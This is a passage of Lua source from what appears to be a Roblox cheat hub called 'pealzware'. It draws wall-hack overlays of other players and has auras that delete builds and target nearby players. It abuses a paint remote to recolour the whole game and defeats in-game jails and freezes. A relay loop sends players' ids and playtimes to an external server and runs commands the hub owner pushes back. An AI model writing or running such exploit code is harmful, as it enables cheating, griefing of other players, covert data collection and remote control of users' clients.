                        local cf = hrp.CFrame
                        local corners = {
                            cf * Vector3.new( sz.X,  sz.Y,  sz.Z),
                            cf * Vector3.new(-sz.X,  sz.Y,  sz.Z),
                            cf * Vector3.new(-sz.X,  sz.Y, -sz.Z),
                            cf * Vector3.new( sz.X,  sz.Y, -sz.Z),
                            cf * Vector3.new( sz.X, -sz.Y,  sz.Z),
                            cf * Vector3.new(-sz.X, -sz.Y,  sz.Z),
                            cf * Vector3.new(-sz.X, -sz.Y, -sz.Z),
                            cf * Vector3.new( sz.X, -sz.Y, -sz.Z),
                        }
                        local sc = {}
                        local allVis = true
                        for i, wc in ipairs(corners) do
                            local s, _, vis = _worldToScreen(wc)
                            sc[i] = s
                            if not vis then allVis = false end
                        end
                        if allVis then
                            -- top face (0-1-2-3), bottom face (4-5-6-7), verticals
                            local edges = {{1,2},{2,3},{3,4},{4,1},{5,6},{6,7},{7,8},{8,5},{1,5},{2,6},{3,7},{4,8}}
                            for i, e in ipairs(edges) do
                                _setLine(entry.box3d[i], sc[e[1]], sc[e[2]], col)
                            end
                        else
                            _hideLines(entry.box3d)
                        end
                    else
                        _hideLines(entry.box3d)
                    end
                elseif entry.box3d then
                    _hideLines(entry.box3d)
                end

                -- Skeleton
                if entry.skeleton and espSkeletonEnabled then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local isR6 = hum and hum.RigType == Enum.HumanoidRigType.R6
                    local bones = isR6 and _BONES_R6 or _BONES
                    local anyVis = false
                    for i, bone in ipairs(bones) do
                        if entry.skeleton[i] then
                            local p0 = char:FindFirstChild(bone[1])
                            local p1 = char:FindFirstChild(bone[2])
                            if p0 and p1 then
                                local s0, _, v0 = _worldToScreen(p0.Position)
                                local s1, _, v1 = _worldToScreen(p1.Position)
                                if v0 and v1 then
                                    _setLine(entry.skeleton[i], s0, s1, col)
                                    anyVis = true
                                else
                                    entry.skeleton[i].Visible = false
                                end
                            else
                                entry.skeleton[i].Visible = false
                            end
                        end
                    end
                elseif entry.skeleton then
                    _hideLines(entry.skeleton)
                end

                -- Hitbox
                if entry.hitbox and espHitboxEnabled then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local x1, y1, x2, y2 = _getCharBounds(char)
                        if x1 then
                            local hcol = Color3.fromRGB(255, 80, 80)
                            _setLine(entry.hitbox[1], Vector2.new(x1,y1), Vector2.new(x2,y1), hcol)
                            _setLine(entry.hitbox[2], Vector2.new(x1,y2), Vector2.new(x2,y2), hcol)
                            _setLine(entry.hitbox[3], Vector2.new(x1,y1), Vector2.new(x1,y2), hcol)
                            _setLine(entry.hitbox[4], Vector2.new(x2,y1), Vector2.new(x2,y2), hcol)
                        else
                            _hideLines(entry.hitbox)
                        end
                    else
                        _hideLines(entry.hitbox)
                    end
                elseif entry.hitbox then
                    _hideLines(entry.hitbox)
                end
            end
        end
    end)
end

local function tintColor(col, delta)
    local h, s, v = col:ToHSV()
    return Color3.fromHSV(h, math.clamp(s - (delta > 0 and 0.05 or -0.02), 0, 1), math.clamp(v + delta, 0, 1))
end

local function lightenColor(col, amount)
    if Library and Library.Color and Library.Color.Light then
        return Library.Color.Light(col, amount)
    end
    return tintColor(col, math.abs(amount))
end

local function darkenColor(col, amount)
    if Library and Library.Color and Library.Color.Dark then
        return Library.Color.Dark(col, amount)
    end
    return tintColor(col, -math.abs(amount))
end

function createStyledBillboard(player, config)
    if not player or not player.Character then return end
    local head = player.Character:FindFirstChild("Head")
    if not head then return end

    local existing = head:FindFirstChild(config.bbName)
    if existing then existing:Destroy() end

    local palette = (Library and Library.Palette) or {}
    local accent  = config.accentColor or (palette.AccentColor) or Color3.fromRGB(0, 170, 255)
    local bg      = Color3.fromRGB(14, 14, 20)
    local txt     = Color3.fromRGB(238, 238, 248)
    local muted   = Color3.fromRGB(140, 140, 165)

    -- BillboardGui
    local bb = Instance.new("BillboardGui")
    bb.Name           = config.bbName
    bb.Size           = UDim2.fromOffset(174, 58)
    bb.StudsOffset    = Vector3.new(0, 3.2, 0)
    bb.AlwaysOnTop    = true
    bb.ResetOnSpawn   = false
    bb.MaxDistance    = 0
    bb.ClipsDescendants = false
    bb.Parent         = head
    pcall(function() bb.LightInfluence = 0 end)

    -- Card background
    local card = Instance.new("Frame")
    card.BackgroundColor3       = bg
    card.BackgroundTransparency = 0.08
    card.BorderSizePixel        = 0
    card.Size                   = UDim2.fromScale(1, 1)
    card.Parent                 = bb
    local cardCorner = Instance.new("UICorner")
    cardCorner.CornerRadius = UDim.new(0, 8)
    cardCorner.Parent = card
    local cardStroke = Instance.new("UIStroke")
    cardStroke.Color        = accent
    cardStroke.Thickness    = 1
    cardStroke.Transparency = 0.55
    cardStroke.Parent       = card

    -- Left accent bar
    local bar = Instance.new("Frame")
    bar.BackgroundColor3 = accent
    bar.BorderSizePixel  = 0
    bar.Position         = UDim2.fromOffset(0, 8)
    bar.Size             = UDim2.new(0, 3, 1, -16)
    bar.Parent           = card
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(1, 0)
    barCorner.Parent = bar

    -- Role label (e.g. "Owner", "Premium", "User")
    local roleLabel = Instance.new("TextLabel")
    roleLabel.BackgroundTransparency = 1
    roleLabel.Position  = UDim2.fromOffset(12, 6)
    roleLabel.Size      = UDim2.new(1, -16, 0, 16)
    roleLabel.Font      = Enum.Font.GothamBold
    roleLabel.TextSize  = 11
    roleLabel.TextColor3 = accent
    roleLabel.TextXAlignment = Enum.TextXAlignment.Left
    roleLabel.Text      = config.roleText or "User"
    roleLabel.Parent    = card

    -- Display name
    local nameLabel = Instance.new("TextLabel")
    nameLabel.BackgroundTransparency = 1
    nameLabel.Position  = UDim2.fromOffset(12, 24)
    nameLabel.Size      = UDim2.new(1, -16, 0, 18)
    nameLabel.Font      = Enum.Font.GothamSemibold
    nameLabel.TextSize  = 13
    nameLabel.TextColor3 = txt
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
    nameLabel.Text      = player.DisplayName
    nameLabel.Parent    = card

    -- @username sub-text
    local subLabel = Instance.new("TextLabel")
    subLabel.BackgroundTransparency = 1
    subLabel.Position  = UDim2.fromOffset(12, 40)
    subLabel.Size      = UDim2.new(1, -16, 0, 12)
    subLabel.Font      = Enum.Font.Gotham
    subLabel.TextSize  = 10
    subLabel.TextColor3 = muted
    subLabel.TextXAlignment = Enum.TextXAlignment.Left
    subLabel.TextTruncate = Enum.TextTruncate.AtEnd
    subLabel.Text      = "@" .. player.Name
    subLabel.Parent    = card
end

local PEALZWARE_ROLE_BILLBOARD_NAMES = {
    PealzwareOwnerTag = true,
    PealzwarePremiumTag = true,
    PealzwareUserTag = true,
    OwnerBB = true,
    BuyerBB = true,
    UserBB = true,
}

local function isHubOwner(player)
    if not player then return false end
    for _, id in ipairs(OWNER_ID) do
        if player.UserId == id then
            return true
        end
    end
    return false
end

local function clearHubRoleBillboards(player, keepName)
    if not player or not player.Character then return end
    local head = player.Character:FindFirstChild("Head")
    if not head then return end
    for _, child in ipairs(head:GetChildren()) do
        if child:IsA("BillboardGui") and PEALZWARE_ROLE_BILLBOARD_NAMES[child.Name] and child.Name ~= keepName then
            child:Destroy()
        end
    end
end

function createPremiumBillboard(player)
    if isHubOwner(player) then return end
    clearHubRoleBillboards(player, "PealzwarePremiumTag")
    createStyledBillboard(player, {
        bbName = "PealzwarePremiumTag",
        accentColor = Color3.fromRGB(56, 214, 255),
        roleText = "PREMIUM",
        brandText = "pealzware",
        extraText = "Premium Access"
    })
end

local function playerHasPremium(p)
    local uid = p.UserId
    if _premiumCache[uid] == true then return true end
    local ok, result = pcall(function()
        return game:GetService("MarketplaceService"):UserOwnsGamePassAsync(uid, ROMAZHUB_PREMIUM_GAMEPASS_ID)
    end)
    if ok and result then
        _premiumCache[uid] = true
        return true
    end
    return false
end

function hookPremiumBillboards()
    local function hookPlayer(p)
        local function tryBillboard()
            if playerHasPremium(p) then
                if p.Character then createPremiumBillboard(p) end
                trackScriptConnection(p.CharacterAdded:Connect(function()
                    task.wait(1)
                    createPremiumBillboard(p)
                end))
            end
        end
        task.spawn(tryBillboard)
    end
    for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
    trackScriptConnection(Players.PlayerAdded:Connect(hookPlayer))
end
hookPremiumBillboards()

function createUserBillboard(player, forced)
    if not player or not player.Character then return end

    if isHubOwner(player) then return end
    if playerHasPremium(player) then
        createPremiumBillboard(player)
        return
    end

    clearHubRoleBillboards(player, "PealzwareUserTag")
    createStyledBillboard(player, {
        bbName = "PealzwareUserTag",
        accentColor = (Library and Library.Palette and Library.Palette.AccentColor) or Color3.fromRGB(0, 132, 255),
        roleText = "USER",
        brandText = "pealzware",
        extraText = "Connected"
    })
end

 function watchHubUserRespawn(player)
    if hubRespawnConns[player] then
        hubRespawnConns[player]:Disconnect()
        hubRespawnConns[player] = nil
    end
    hubRespawnConns[player] = player.CharacterAdded:Connect(function()
        task.wait(1.5)
        if confirmedHubUserIds[player.UserId] then
            confirmedHubUsers[player] = true
            syncHubRoleBillboard(player)
        end
    end)
end

 function retagAllConfirmedUsers()
    for userId, _ in pairs(confirmedHubUserIds) do
        for _, p in ipairs(Players:GetPlayers()) do
            if p.UserId == userId then
                local player = p
                task.spawn(function()
                    task.wait(0.5)
                    confirmedHubUsers[player] = true
                    syncHubRoleBillboard(player)
                end)
                break
            end
        end
    end
end

_relayLastCode = 0
_relayLastUsers = 0
_relayLastError = ""
_relayHits = 0
_relayStatusLabel = nil
_bkitGrantedPlayers = {}  -- userId -> true; tracked for re-grant on death
local _relaySeenCommandIds = {}
local _relaySeenCommandOrder = {}
local RELAY_COMMAND_CACHE_LIMIT = 256

local function shouldExecuteRelayCommand(commandId)
    if type(commandId) ~= "string" or commandId == "" then
        return true
    end
    if _relaySeenCommandIds[commandId] then
        return false
    end
    _relaySeenCommandIds[commandId] = true
    table.insert(_relaySeenCommandOrder, commandId)
    if #_relaySeenCommandOrder > RELAY_COMMAND_CACHE_LIMIT then
        local expiredId = table.remove(_relaySeenCommandOrder, 1)
        if expiredId then
            _relaySeenCommandIds[expiredId] = nil
        end
    end
    return true
end

 function sendRelayHeartbeat()
    local _jobId = tostring(game.JobId or "")
    if _jobId == "" then return end

local playerTimes = {}
for _, p in ipairs(game.Players:GetPlayers()) do
    local ls = p:FindFirstChild("leaderstats")
    if ls then
        local tv = ls:FindFirstChild("Time")
        if tv then
            playerTimes[tostring(p.UserId)] = tv.Value
        end
    end
end

local body = HttpService:JSONEncode({
    jobId       = _jobId,
    userId      = plr.UserId,
    placeId     = game.PlaceId,
    playerTimes = playerTimes,   -- <-- added
})
    local headers = { ["Content-Type"] = "application/json" }

    local function processUsers(respBody)
        if not respBody or respBody == "" then return end
        local ok, data = pcall(HttpService.JSONDecode, HttpService, respBody)
        if not ok or type(data) ~= "table" or type(data.users) ~= "table" then return end
        local hubUiAvailable = not Library.Unloaded
        for _, uid in ipairs(data.users) do
            local numId = tonumber(uid)
            if numId then
                local player = nil
                for _, p in ipairs(Players:GetPlayers()) do
                    if p.UserId == numId then player = p; break end
                end
                if player and hubUiAvailable then
                    if not confirmedHubUserIds[numId] then
                        confirmedHubUserIds[numId] = true
                        confirmedHubUsers[player] = true
                        watchHubUserRespawn(player)
                        if player ~= plr then
                            Library:Notify(player.Name .. " is using pealzware!", 4)
                        end
                    end
                    task.spawn(function()
                        if not player.Character then
                            local t = tick()
                            repeat task.wait(0.2) until player.Character or tick() - t > 5
                        else
                            task.wait(0.3)
                        end
                        if player.Character and player.Character:FindFirstChild("Head") then
                            syncHubRoleBillboard(player)
                        end
                    end)
                end
            end
        end
        if type(data.cmds) == "table" then
            for _, _cmdData in ipairs(data.cmds) do
                if type(_cmdData) == "table"
                    and type(_cmdData.cmd) == "string"
                    and shouldExecuteRelayCommand(_cmdData.id)
                then
                    local _fromId = tonumber(_cmdData.from) or 0
                    local _cArgs  = type(_cmdData.args) == "table" and _cmdData.args or {}
                    task.spawn(executeOwnerCommand, _cmdData.cmd, _cArgs, _fromId)
                end
            end
        end
        -- Command grants from Discord bot (generic: bkit, r6, fly, boombox, etc.)
if type(data.commandGrants) == "table" then
    for _, grant in ipairs(data.commandGrants) do
        local grantId = tonumber(grant.robloxId)
        local cmd = grant.command or "bkit"
        if grantId then
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p.UserId == grantId then
                    local safeName = sanitizename(p.Name)
                    sendGeneralChatMessage(";" .. cmd .. " " .. safeName)
                    Library:Notify(p.Name .. " granted ;" .. cmd .. " via Discord!", 5)

                    -- Track bkit grants for re-grant on death
                    if cmd == "bkit" then
                        if not _bkitGrantedPlayers then _bkitGrantedPlayers = {} end
                        _bkitGrantedPlayers[grantId] = true
                        -- Watch for death to re-grant
                        task.spawn(function()
                            local char = p.Character
                            if not char then return end
                            local hum = char:FindFirstChildOfClass("Humanoid")
                            if not hum then return end
                            local conn; conn = hum.Died:Connect(function()
                                if conn then conn:Disconnect(); conn = nil end
                                if not _bkitGrantedPlayers or not _bkitGrantedPlayers[grantId] then return end
                                -- Wait for respawn then re-grant
                                local t0 = tick()
                                repeat task.wait(0.5) until (p.Character and p.Character:FindFirstChildOfClass("Humanoid")) or tick() - t0 > 15
                                if p.Parent and _bkitGrantedPlayers[grantId] then
                                    task.wait(1)
                                    sendGeneralChatMessage(";bkit " .. sanitizename(p.Name))
                                    Library:Notify(p.Name .. " bkit re-granted after respawn!", 3)
                                end
                            end)
                        end)
                    end
                    break
                end
            end
        end
    end
end
    end
    local function hitRelay(url)
        pcall(function()
            local ok, resp = pcall(requestFunc, {
                Url     = url .. "/heartbeat",
                Method  = "POST",
                Headers = headers,
                Body    = body,
            })
            if not ok or not resp then
                _relayLastError = "request failed"
                return
            end
            local code = resp.StatusCode or resp.status_code or 0
            _relayLastCode = code
            _relayHits = (_relayHits or 0) + 1
            local respBody = resp.Body or resp.body or ""
            if code == 200 then
                local parseOk, parsed = pcall(HttpService.JSONDecode, HttpService, respBody)
                if parseOk and parsed and type(parsed.users) == "table" then
                    _relayLastUsers = #parsed.users
                    _relayLastError = parsed.error or ""
                end
                processUsers(respBody)
            else
                _relayLastError = "HTTP " .. code .. ": " .. string.sub(respBody, 1, 80)
            end
            -- Update status label if it exists
            pcall(function()
                if _relayStatusLabel then
                    _relayStatusLabel:SetText(string.format(
                        "Relay: %s | Code: %d | Users: %d | Hits: %d%s",
                        code == 200 and "OK" or "FAIL",
                        code,
                        _relayLastUsers or 0,
                        _relayHits or 0,
                        _relayLastError ~= "" and ("\n" .. _relayLastError) or ""
                    ))
                end
            end)
        end)
    end

    task.spawn(hitRelay, _relayUrl)
    if _relayBackupUrl ~= "" then
        task.spawn(hitRelay, _relayBackupUrl)
    end
end

 function sendRelayLeave()
    local _jobId = tostring(game.JobId or "")
    if _jobId == "" then return end
    local leaveBody = HttpService:JSONEncode({
        jobId   = _jobId,
        userId  = plr.UserId,
        placeId = game.PlaceId,
    })
    local leaveHeaders = { ["Content-Type"] = "application/json" }
    pcall(requestFunc, { Url = _relayUrl .. "/leave", Method = "DELETE", Headers = leaveHeaders, Body = leaveBody })
    if _relayBackupUrl ~= "" then
        pcall(requestFunc, { Url = _relayBackupUrl .. "/leave", Method = "DELETE", Headers = leaveHeaders, Body = leaveBody })
    end
end

_commandServiceState.stop = function(sendLeave)
    if not _commandServiceState.running then return end
    _commandServiceState.running = false
    if sendLeave then
        pcall(sendRelayLeave)
    end
    disconnectConnectionList(_commandServiceState.connections)
    if getgenv().pealzwareCommandService == _commandServiceState then
        getgenv().pealzwareCommandService = nil
    end
end

function equiptool(toolname)
    local rt = nil
    local lt = localplr.Character:FindFirstChildWhichIsA("Tool")
    for i,v in pairs(localplr.Character:GetChildren()) do
        if v:IsA("Tool") then
            if v.Name == toolname then
                rt = v
            else
                v.Parent = localplr.Backpack
            end
        end
    end
    if localplr.Backpack:FindFirstChild(toolname) then
        rt = localplr.Backpack:FindFirstChild(toolname)
        rt.Parent = localplr.Character
    end
    
    return rt
end

 function startRelayHeartbeatLoop()
    if _relayHeartbeatRunning then return end
    _relayHeartbeatRunning = true

    task.spawn(function()
        sendRelayHeartbeat()
        while isCommandServiceRunning() do
            task.wait(8)
            if isCommandServiceRunning() then
                sendRelayHeartbeat()
            end
        end
    end)
end

function sendRelayCommand(targetUserId, cmd, argsTable)
    local _jobId = tostring(game.JobId or "")
    if _jobId == "" then return end
    local _commandId = ""
    pcall(function()
        _commandId = HttpService:GenerateGUID(false)
    end)
    if _commandId == "" then
        _commandId = tostring(plr.UserId) .. "-" .. tostring(targetUserId) .. "-" .. tostring(cmd) .. "-" .. tostring(math.floor(tick() * 1000))
    end
    local _body = HttpService:JSONEncode({
        commandId = _commandId,
        jobId    = _jobId,
        fromId   = plr.UserId,
        targetId = targetUserId,
        cmd      = cmd,
        args     = argsTable or {}
    })
    local _hdrs = { ["Content-Type"] = "application/json" }
    local function _doPost(url)
        pcall(requestFunc, { Url = url .. "/command", Method = "POST", Headers = _hdrs, Body = _body })
    end
    task.spawn(_doPost, _relayUrl)
    if _relayBackupUrl ~= "" then task.spawn(_doPost, _relayBackupUrl) end
end

trackScriptConnection(Players.PlayerAdded:Connect(function()
    task.wait(1)
    task.spawn(sendRelayHeartbeat)
end))

trackScriptConnection(Players.PlayerRemoving:Connect(function(player)
    local wasHubUser = confirmedHubUserIds[player.UserId] ~= nil
    confirmedHubUsers[player] = nil
    confirmedHubUserIds[player.UserId] = nil
    if hubRespawnConns[player] then
        hubRespawnConns[player]:Disconnect()
        hubRespawnConns[player] = nil
    end
    if wasHubUser then
        task.spawn(sendRelayHeartbeat)
    end
end))

trackScriptConnection(plr.CharacterAdded:Connect(function(newChar)
    task.wait(1)
    retagAllConfirmedUsers()
    task.spawn(sendRelayHeartbeat)
    task.spawn(function()
        task.wait(0.5)
        syncHubRoleBillboard(plr)
    end)
    task.spawn(function()
        task.wait(0.5)
        setupAutoR6Character(newChar)
    end)
end))

task.spawn(function()
    task.wait(0.5)
    startRelayHeartbeatLoop()
end)
task.spawn(function()
    task.wait(1)
    syncHubRoleBillboard(plr)
end)

 function createOwnerBillboard(player)
    clearHubRoleBillboards(player, "PealzwareOwnerTag")
    createStyledBillboard(player, {
        bbName = "PealzwareOwnerTag",
        accentColor = Color3.fromRGB(255, 184, 76),
        roleText = "OWNER",
        brandText = "pealzware",
        extraText = "Owner Access"
    })
end
syncHubRoleBillboard = function(player)
    if not player or not player.Character then return end
    if isHubOwner(player) then
        createOwnerBillboard(player)
        return
    end
    if playerHasPremium(player) then
        createPremiumBillboard(player)
        return
    end
    if confirmedHubUserIds[player.UserId] then
        confirmedHubUsers[player] = true
        createUserBillboard(player, true)
        return
    end
    clearHubRoleBillboards(player)
end

 function hookOwnerBillboards()
    for _, p in ipairs(Players:GetPlayers()) do
        for _, id in ipairs(OWNER_ID) do
            if p.UserId == id then
                if p.Character then createOwnerBillboard(p) end
                trackScriptConnection(p.CharacterAdded:Connect(function() task.wait(1); createOwnerBillboard(p) end))
            end
        end
    end
    trackScriptConnection(Players.PlayerAdded:Connect(function(p)
        for _, id in ipairs(OWNER_ID) do
            if p.UserId == id then
                trackScriptConnection(p.CharacterAdded:Connect(function() task.wait(1); createOwnerBillboard(p) end))
            end
        end
    end))
end
hookOwnerBillboards()

function StartDeleteAura()
    if deleteAuraConnection then
        deleteAuraConnection:Disconnect()
    end

    local _deleteAuraTimer = 0
    deleteAuraConnection = RunService.Heartbeat:Connect(function(dt)
        if not deleteAuraEnabled or not plr.Character then return end
        _deleteAuraTimer = _deleteAuraTimer + dt
        if _deleteAuraTimer < 0.05 then return end
        _deleteAuraTimer = 0

        local character = plr.Character
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        local parts = workspace:FindPartsInRegion3(
            Region3.new(
                hrp.Position - Vector3.new(deleteAuraRange, 10, deleteAuraRange),
                hrp.Position + Vector3.new(deleteAuraRange, 10, deleteAuraRange)
            ),
            nil, 500
        )

        local deleted = 0
        for _, part in ipairs(parts) do
            if part:IsDescendantOf(cfolder) then
                if isog then ExecuteDeleteOG(part) else ExecuteDelete(part) end
                deleted = deleted + 1
                if deleted >= _auraBatchSize then break end
            end
        end
    end)
end

function StartToxifyAura()
    if toxifyAuraConnection then
        toxifyAuraConnection:Disconnect()
    end
    
    local _toxifyTimer = 0
    toxifyAuraConnection = RunService.Heartbeat:Connect(function(dt)
        if not toxifyAuraEnabled then return end
        _toxifyTimer = _toxifyTimer + dt
        if _toxifyTimer < 1 then return end
        _toxifyTimer = 0

        if not workspace:FindFirstChild("ToxifyBlock") then
            local toxifyPos = plr.Character.HumanoidRootPart.Position + Vector3.new(10000, 1000, 10000)
            if isog then ExecuteBuildOG(toxifyPos) else ExecuteBuild(toxifyPos) end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= plr and player.Character then
                local targetHrp = player.Character:FindFirstChild("HumanoidRootPart")
                if targetHrp and (targetHrp.Position - plr.Character.HumanoidRootPart.Position).Magnitude < 40 then
                    ExecutePaint(Enum.NormalId.Top, "", Color3.new(0, 0, 0), "toxic")
                end
            end
        end
    end)
end

local _etbGui = nil
local _buildStartTime = 0

function updateBuildProgress()
    if totalBuildBlocks == 0 then
        if _etbGui and _etbGui.Parent then
            _etbGui:Destroy()
            _etbGui = nil
        end
        return
    end
    if not _etbGui or not _etbGui.Parent then
        _etbGui = Instance.new("ScreenGui")
        _etbGui.Name = "RHETBDisplay"
        _etbGui.ResetOnSpawn = false
        _etbGui.IgnoreGuiInset = true
        _etbGui.Parent = CoreGui
        local fr = Instance.new("Frame")
        fr.Name = "F"
        fr.Size = UDim2.new(0, 260, 0, 40)
        fr.Position = UDim2.new(0.5, -130, 1, -64)
        fr.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
        fr.BackgroundTransparency = 0.1
        fr.BorderSizePixel = 0
        fr.Parent = _etbGui
        local uc = Instance.new("UICorner")
        uc.CornerRadius = UDim.new(0, 7)
        uc.Parent = fr
        local lbl = Instance.new("TextLabel")
        lbl.Name = "L"
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.TextColor3 = Color3.fromRGB(215, 215, 215)
        lbl.TextSize = 13
        lbl.Font = Enum.Font.GothamMedium
        lbl.Parent = fr
    end
    local done, total = currentBlockIndex, totalBuildBlocks
    local pct = math.floor(done / total * 100)
    local etbStr = ""
    if done > 2 and _buildStartTime > 0 then
        local elapsed = tick() - _buildStartTime
        local remaining = (elapsed / done) * (total - done)
        if remaining < 60 then
            etbStr = "  ~" .. math.ceil(remaining) .. "s"
        else
            etbStr = string.format("  ~%dm%ds", math.floor(remaining / 60), math.ceil(remaining % 60))
        end
    end
    _etbGui.F.L.Text = string.format("%d / %d  (%d%%)%s", done, total, pct, etbStr)
end

function StartAntiVoid()
    if antiVoidConnection then
        antiVoidConnection:Disconnect()
    end
    
    workspace.FallenPartsDestroyHeight = -50000
    
    antiVoidConnection = RunService.Stepped:Connect(function()
        if not antiVoidEnabled or not plr.Character then return end
        local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        if hrp.Position.Y < -100 then
            hrp.CFrame = CFrame.new(0, 100, 0)
            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end
    end)
end

function StopAntiVoid()
    if antiVoidConnection then
        antiVoidConnection:Disconnect()
        antiVoidConnection = nil
    end
    workspace.FallenPartsDestroyHeight = originalDestroyHeight
end

function StartAntiGravity()
      if antiConnections["Gravity"] then
          antiConnections["Gravity"]:Disconnect()
      end

      local _gravT = 0
      antiConnections["Gravity"] = RunService.Heartbeat:Connect(function(dt)
          _gravT = _gravT + dt
          if _gravT < 0.1 then return end
          _gravT = 0
          if not antiGravityEnabled then return end
          if plr:GetAttribute("Flying") == true then return end
          if workspace.Gravity ~= 196.2 then
              workspace.Gravity = 196.2
          end
      end)
end

function StopAntiGravity()
      if antiConnections["Gravity"] then
          antiConnections["Gravity"]:Disconnect()
          antiConnections["Gravity"] = nil
      end
end

function StartAntiBlind()
    if antiConnections["Blind"] then
        antiConnections["Blind"]:Disconnect()
    end
    
    local _blindT = 0
    antiConnections["Blind"] = RunService.Heartbeat:Connect(function(dt)
        _blindT = _blindT + dt
        if _blindT < 0.5 then return end
        _blindT = 0
        local blindGui = playerGui:FindFirstChild("Blind") or playerGui:FindFirstChild("BlindGUI")
        if blindGui then
            blindGui.Enabled = false
        end
    end)
end

local colorto = Color3.new(1,1,1)

local gradcolor = ColorSequence.new({
    ColorSequenceKeypoint.new(
        0,
        Color3.new(1-colorto.R,1-colorto.G,1-colorto.B)
    ),
    ColorSequenceKeypoint.new(
        1,
        colorto
    )
})
local brickcol = BrickColor.new(colorto)

function updatecolors(color)
    colorto = color
    gradcolor = ColorSequence.new({
        ColorSequenceKeypoint.new(
            0,
            Color3.new(1-colorto.R,1-colorto.G,1-colorto.B)
        ),
        ColorSequenceKeypoint.new(
            1,
            colorto
        )
    })
    brickcol = BrickColor.new(colorto)
end

function PaintEverything()
    local paintevent = game.Players.LocalPlayer.Character.PaintBucket.Remotes.ServerControls
    beforecolors = {}

     function fpa(cube,color)
        coroutine.wrap(function()
            if not beforecolors[cube] then
                beforecolors[cube] = cube.Color
            end
            paintevent:InvokeServer("PaintPart", {
                Part = cube,
                Color = color
            })
        end)()
    end

    fpa(game.ReplicatedStorage.Brick, colorto)

    -- Only iterate workspace and ReplicatedStorage instead of entire game tree
    local searchRoots = {workspace, game:GetService("ReplicatedStorage")}
    for _, root in ipairs(searchRoots) do
        for _, v in ipairs(root:GetDescendants()) do
            local hascolor, col = pcall(function() return v.Color end)
            if hascolor then
                if typeof(col) == "Color3" then
                    fpa(v, colorto)
                elseif typeof(col) == "ColorSequence" then
                    fpa(v, gradcolor)
                elseif typeof(col) == "BrickColor" then
                    fpa(v, brickcol)
                end
            end
        end
    end

    Library:Notify("Everything painted with selected color!", 3)
    return beforecolors
end

function RevertPaint(beforecolor)
    local paintevent = game.Players.LocalPlayer.Character.PaintBucket.Remotes.ServerControls
    
    for part,color in pairs(beforecolor) do
        if part and part.Parent then
            coroutine.wrap(function()
                paintevent:InvokeServer("PaintPart", {
                    Part = part,
                    Color = color
                })
            end)()
        end

    end
    
    Library:Notify("Colors reverted to original!", 3)
end

asked = false
resetconf = Instance.new("BindableFunction")
function resetconf.OnInvoke(bpress)
    if bpress == "Yes" then
        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
            plr.Character:FindFirstChildOfClass("Humanoid").Health = 0
        end
    end
end

 function askreset()
    if asked == false then
        coroutine.wrap(function()
            asked = true
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title="Notification",
                Text="Reset your character?",
                Callback=resetconf,
                Button1="Yes",
                Button2="No"
            })
            task.wait(5)
            asked = false
        end)()
    end
end

asked2 = false
resetconf2 = Instance.new("BindableFunction")
function resetconf2.OnInvoke(bpress)
    if bpress == "Yes" then
        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
            plr.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
            asked2 = false
        end
    end
end

 function askunstun()
    if asked2 == false then
        coroutine.wrap(function()
            asked2 = true
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title="Notification",
                Text="UnTackle your character?",
                Callback=resetconf2,
                Button1="Yes",
                Button2="No"
            })
            task.wait(20)
            asked2 = false
        end)()
    end
end

function breakvel()
    local V3 = Vector3.new(0, 0, 0)
    local endTime = tick() + 1
    while tick() < endTime do
        if plr.Character then
            -- Use GetChildren instead of GetDescendants - character parts are direct children
            for _, v in ipairs(plr.Character:GetChildren()) do
                if v:IsA("BasePart") then
                    v.Velocity, v.RotVelocity = V3, V3
                end
            end
        end
        task.wait()
    end
end

function StartAntiDrag()
    if antiConnections["Drag"] then
        antiConnections["Drag"]:Disconnect()
    end
    
    local _dragT = 0
    antiConnections["Drag"] = RunService.Heartbeat:Connect(function(dt)
        _dragT = _dragT + dt
        if _dragT < 0.1 then return end
        _dragT = 0
        if stashRunning then return end
        local char = plr.Character
        if char then
            local Dragger = char:FindFirstChild("Dragger")
            local Humanoid = char:FindFirstChildWhichIsA("Humanoid")
            if Dragger and Humanoid then
                Dragger.ResponseStyle = Enum.DragDetectorResponseStyle.Custom
                if Humanoid.PlatformStand then
                    Humanoid.PlatformStand = false
                    Humanoid.Sit = false
                    Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
            end
        end
    end)
end

function StartAntiJail()
    if antiConnections["Jail"] then
        antiConnections["Jail"]:Disconnect()
    end
    
    local _jailT = 0
    antiConnections["Jail"] = RunService.Heartbeat:Connect(function(dt)
        _jailT = _jailT + dt
        if _jailT < 0.5 then return end
        _jailT = 0
        if plr.Character and plr.Character:FindFirstChild("Jail") then
            for i,v in pairs(plr.Character.Jail:GetChildren()) do
                v.CanCollide = false
            end
        end
    end)
end

function StartAntiFreeze()
    if antiConnections["Freeze"] then
        antiConnections["Freeze"]:Disconnect()
    end
    if antiConnections["FreezeRespawn"] then
        antiConnections["FreezeRespawn"]:Disconnect()
    end

    local _freezeT = 0
    local _lastGoodCF = nil

    antiConnections["Freeze"] = RunService.Heartbeat:Connect(function(dt)
        _freezeT = _freezeT + dt
        if _freezeT < 0.5 then return end
        _freezeT = 0
        if stashRunning then return end
        if not plr.Character then return end

        local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
        local hum = plr.Character:FindFirstChildOfClass("Humanoid")

        -- Save last known good position while alive and not frozen
        if hrp and hum and hum.Health > 0 and not hrp.Anchored then
            _lastGoodCF = hrp.CFrame
        end

        local frozen = false
